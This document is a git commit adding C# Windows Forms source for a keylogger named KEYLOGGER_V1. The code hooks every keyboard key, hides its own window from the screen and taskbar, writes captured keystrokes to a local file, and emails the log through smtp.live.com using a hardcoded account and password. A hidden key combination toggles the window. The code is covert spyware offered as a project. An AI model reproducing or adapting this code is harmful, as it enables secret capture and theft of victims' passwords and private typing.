189985f7462f1a407c07f999560156c24a3cfb77
Rafael Almeida <rafael.silva_pessoal@outlook.com>
2017-10-05 12:33:03 -0300

    Adicionando projeto desenvolvido nas ferias

---
+++ KEYLOGGER_V1/FrmHome.Designer.cs
@@ -0,0 +1,109 @@
+﻿namespace KEYLOGGER_V1
+{
+    partial class FrmHome
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmHome));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            this.txtTextoDigitado = new System.Windows.Forms.TextBox();
+            this.tmEnviarEmail = new System.Windows.Forms.Timer(this.components);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::KEYLOGGER_V1.Properties.Resources.matrix1__42_;
+            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(334, 402);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // pictureBox2
+            // 
+            this.pictureBox2.Image = global::KEYLOGGER_V1.Properties.Resources.matrix1__42_;
+            this.pictureBox2.Location = new System.Drawing.Point(293, 0);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(345, 402);
+            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox2.TabIndex = 1;
+            this.pictureBox2.TabStop = false;
+            // 
+            // txtTextoDigitado
+            // 
+            this.txtTextoDigitado.Location = new System.Drawing.Point(45, 14);
+            this.txtTextoDigitado.Multiline = true;
+            this.txtTextoDigitado.Name = "txtTextoDigitado";
+            this.txtTextoDigitado.Size = new System.Drawing.Size(549, 378);
+            this.txtTextoDigitado.TabIndex = 2;
+            this.txtTextoDigitado.TabStop = false;
+            this.txtTextoDigitado.Text = "\\";
+            this.txtTextoDigitado.TextChanged += new System.EventHandler(this.txtTextoDigitado_TextChanged);
+            // 
+            // tmEnviarEmail
+            // 
+            this.tmEnviarEmail.Enabled = true;
+            this.tmEnviarEmail.Interval = 300000;
+            this.tmEnviarEmail.Tick += new System.EventHandler(this.tmEnviarEmail_Tick);
+            // 
+            // FrmHome
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ControlText;
+            this.ClientSize = new System.Drawing.Size(639, 402);
+            this.Controls.Add(this.txtTextoDigitado);
+            this.Controls.Add(this.pictureBox2);
+            this.Controls.Add(this.pictureBox1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "FrmHome";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "KEY";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmHome_FormClosing);
+            this.Load += new System.EventHandler(this.FrmHome_Load);
+            this.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.FrmHome_KeyPress);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.PictureBox pictureBox2;
+        private System.Windows.Forms.TextBox txtTextoDigitado;
+        private System.Windows.Forms.Timer tmEnviarEmail;
+    }
+}
+
---
+++ KEYLOGGER_V1/FrmHome.cs
@@ -0,0 +1,486 @@
+﻿using System;
+using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Net.Mail;
+using System.Diagnostics;
+
+namespace KEYLOGGER_V1
+{
+    public partial class FrmHome : Form
+    {
+        int conta;
+        string[] names = new string[3];
+        
+        //istanciar Class Caputura de Teclas
+        globalKeyboardHook gkh = new globalKeyboardHook();
+        private void HookAll()
+        {
+            foreach (object key in Enum.GetValues(typeof(Keys)))
+            {
+                gkh.HookedKeys.Add((Keys)key);
+            }
+        }
+
+        void gkh_KeyDown(object sender, KeyEventArgs e)
+        {
+            txtTextoDigitado.Text += GerenciamentoDeCaracteres(Convert.ToString(e.KeyCode));
+        }
+        public FrmHome()
+        {
+            InitializeComponent();
+        }
+        public FrmHome(bool visibilidade)
+        {
+            //InitializeComponent();
+            if (visibilidade == true){
+                visivel();
+            }
+           
+        }
+        private void FrmHome_Load(object sender, EventArgs e)
+        {   //deixa o formulario Invisivel
+            invisivel();
+            MetodosDeEventosHook();
+            if (Verifica_backup() == true)
+            {
+                if (Habilitar_web() == true)
+                {   // enviar backup para email
+                    EnviarEmailBackup(@"C:\Key\Keylogger.txt");
+                    //deleta backup
+
+                }
+
+            }
+
+        }
+        void invisivel()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+
+        }
+        public void visivel()
+        {
+            this.Opacity = 100;
+            this.ShowInTaskbar = true;
+        }
+        void MetodosDeEventosHook()
+        {
+            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
+            HookAll();
+        }
+        bool Verifica_backup()
+        {
+
+            if (File.Exists(@"C:\Key\Keylogger.txt"))
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+
+        }
+        private void tmEnviarEmail_Tick(object sender, EventArgs e)
+        {
+            //BackupOrEmail();
+        }
+
+        [DllImport("wininet.dll")]
+
+        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);
+        bool Habilitar_web()
+        {
+            bool result;
+
+            try
+            {
+
+                int Description;
+
+                result = InternetGetConnectedState(out Description, 0);
+
+            }
+
+            catch
+            {
+               // MessageBox.Show("Esta sem Internet!!");
+                result = false;
+
+            }
+
+            return result;
+        }
+        void EnviarEmail(String Texto)
+        {
+
+            MailMessage Email;
+            Stopwatch Stop = new Stopwatch();
+            Email = new MailMessage();
+            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
+            Email.From = (new MailAddress("OrionOficial@outlook.com"));
+            Email.Subject = "KeyLLogger";
+            Email.IsBodyHtml = true;
+            Email.Body = Texto;
+            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
+            using (cliente)
+            {
+                cliente.Credentials = new System.Net.NetworkCredential("OrionOficial@outlook.com", "Orion0f1c1al");
+                cliente.EnableSsl = true;
+                cliente.Send(Email);
+            }
+            //MessageBox.Show("Email enviado com sucesso!!", "Email - Enviado!");
+            txtTextoDigitado.Clear();
+
+        }
+        void EnviarEmailBackup(String DirBackup)
+        {
+            MailMessage Email;
+            Stopwatch Stop = new Stopwatch();
+            Email = new MailMessage();
+            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));
+            Email.From = (new MailAddress("OrionOficial@outlook.com"));
+            Email.Subject = "KeyLLogger";
+            Email.IsBodyHtml = true;
+            Email.Attachments.Add(new Attachment(DirBackup));
+            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
+            using (cliente)
+            {
+                cliente.Credentials = new System.Net.NetworkCredential("OrionOficial@outlook.com", "Orion0f1c1al");
+                cliente.EnableSsl = true;
+                cliente.Send(Email);
+            }
+            //MessageBox.Show("Backup enviado com sucesso!!", "Email - Enviado!");
+
+        }
+        void criarBackup(String DirBackup)
+        {
+
+            StreamWriter SW = new StreamWriter(DirBackup, true);
+            SW.Write(txtTextoDigitado.Text);
+            SW.Close();
+            txtTextoDigitado.Clear();
+           // MessageBox.Show("Criado backup com sucesso!");
+        }
+        void BackupOrEmail()
+        {
+
+            if (Habilitar_web() == true)
+            {
+                if (txtTextoDigitado.Text != "")
+                {
+                    EnviarEmail(txtTextoDigitado.Text);
+                }
+
+
+            }
+            else
+            {
+
+                criarBackup(@"C:\Key\Keylogger.txt");
+
+            }
+        }
+        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            File.Delete(@"C:\Key\Keylogger.txt");
+            if (txtTextoDigitado.Text != ""){
+                criarBackup(@"C:\Key\Keylogger.txt");
+            }
+            
+        }
+        String GerenciamentoDeCaracteres(String Key)
+        {
+
+            switch (Key)
+            {
+
+                case "LWin":
+
+                    return "[Win]";
+                    break;
+                case "LControlKey":
+
+                    return "[Ctrl]";
+                case "RControlKey":
+
+                    return "[Ctrl]";
+                    break;
+                case "LMenu":
+
+                    return "[Alt]";
+                    break;
+                case "RMenu":
+
+                    return "[Alt]";
+                    break;
+                case "Return":
+
+                    return "[Enter]";
+                    break;
+                case "Space":
+
+                    return "[Space]";
+                    break;
+                case "LShiftKey":
+
+                    return "[Shift]";
+                    break;
+                case "RShiftKey":
+
+                    return "[Shift]";
+                    break;
+                case "Capital":
+
+                    return "[Caps Lock]";
+                    break;
+                case "Tab":
+
+                    return "[Tab]";
+                    break;
+                case "Oemtilde":
+
+                    return "'";
+                    break;
+                case "Escape":
+
+                    return "[Esc]";
+                    break;
+                case "Back":
+
+                    return "[Back]";
+                    break;
+                case "PrintScreen":
+
+                    return "[Print Screen]";
+                    break;
+                case "Pause":
+
+                    return "[Pause Break]";
+                    break;
+                case "Insert":
+
+                    return "[Insert]";
+                    break;
+                case "Delete":
+
+                    return "[Delete]";
+                    break;
+                case "Home":
+
+                    return "[Home]";
+                    break;
+                case "PageUp":
+
+                    return "[Page Up]";
+                    break;
+                case "Next":
+
+                    return "[Page Down]";
+                    break;
+                case "End":
+
+                    return "[End]";
+                    break;
+                case "Apps":
+
+                    return "[Menu]";
+                    break;
+                case "Up":
+
+                    return "[Up]";
+                    break;
+                case "Down":
+
+                    return "[Down]";
+                    break;
+                case "Right":
+
+                    return "[Right]";
+                    break;
+                case "Left":
+
+                    return "[Left]";
+                    break;
+                case "Oemplus":
+
+                    return "=";
+                    break;
+                case "OemMinus":
+
+                    return "-";
+                    break;
+                case "Oem6":
+
+                    return "[";
+                    break;
+                case "Oem5":
+                    return "]";
+                    break;
+                case "Oem7":
+
+                    return "";
+                    break;
+                case "OemOpenBrackets":
+
+                    return "´";
+                    break;
+                case "Oem1":
+
+                    return "Ç";
+                    break;
+                case "Oemcomma":
+
+                    return ",";
+                    break;
+                case "OemPeriod":
+
+                    return ".";
+                    break;
+                case "OemQuestion":
+
+                    return ";";
+                    break;
+                case "D1":
+
+                    return "1";
+                    break;
+                case "D2":
+
+                    return "2";
+                    break;
+                case "D3":
+
+                    return "3";
+                    break;
+                case "D4":
+
+                    return "4";
+                    break;
+                case "D5":
+
+                    return "5";
+                    break;
+                case "D6":
+
+                    return "6";
+                    break;
+                case "D7":
+
+                    return "7";
+                    break;
+                case "D8":
+
+                    return "8";
+                    break;
+                case "D9":
+
+                    return "9";
+                    break;
+                case "D0":
+
+                    return "0";
+                    break;
+                case "F1":
+
+                    return "[F1]";
+                    break;
+                case "F2":
+
+                    return "[F2]";
+                    break;
+                case "F3":
+
+                    return "[F3]";
+                    break;
+                case "F4":
+
+                    return "[F4]";
+                    break;
+                case "F5":
+
+                    return "[F5]";
+                    break;
+                case "F6":
+
+                    return "[F6]";
+                    break;
+                case "F7":
+
+                    return "[F7]";
+                    break;
+                case "F8":
+
+                    return "[F8]";
+                    break;
+                case "F9":
+
+                    return "[F9]";
+                    break;
+                case "F10":
+
+                    return "[F10]";
+                    break;
+                case "F11":
+
+                    return "[F11]";
+                    break;
+                case "F12":
+
+                    return "[F12]";
+                    break;
+
+
+                default:
+
+                    return Key;
+            }
+
+
+        }
+        private void FrmHome_KeyPress(object sender, KeyPressEventArgs e)
+        {
+
+        }
+        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)
+        {
+            String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento
+
+            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter)
+            {
+                if (this.Opacity == 0 && this.ShowInTaskbar == false)
+                {
+                    visivel();
+
+                }
+                else { 
+                    
+                    invisivel(); 
+                                                  
+                }
+            }
+        }
+        String teclaDeVisibilidade(String texto, String caracter)
+        {
+
+            int contCarac = caracter.Length;
+            int contText = texto.Length;
+
+            if (contText >= contCarac)
+            {
+                int result = contText - contCarac;
+                String caracteres = texto.Substring(result, contCarac);
+                return caracteres;
+            }
+            else
+            {
+                return texto;
+            }
+            
+
+        }
+
+    }
+}
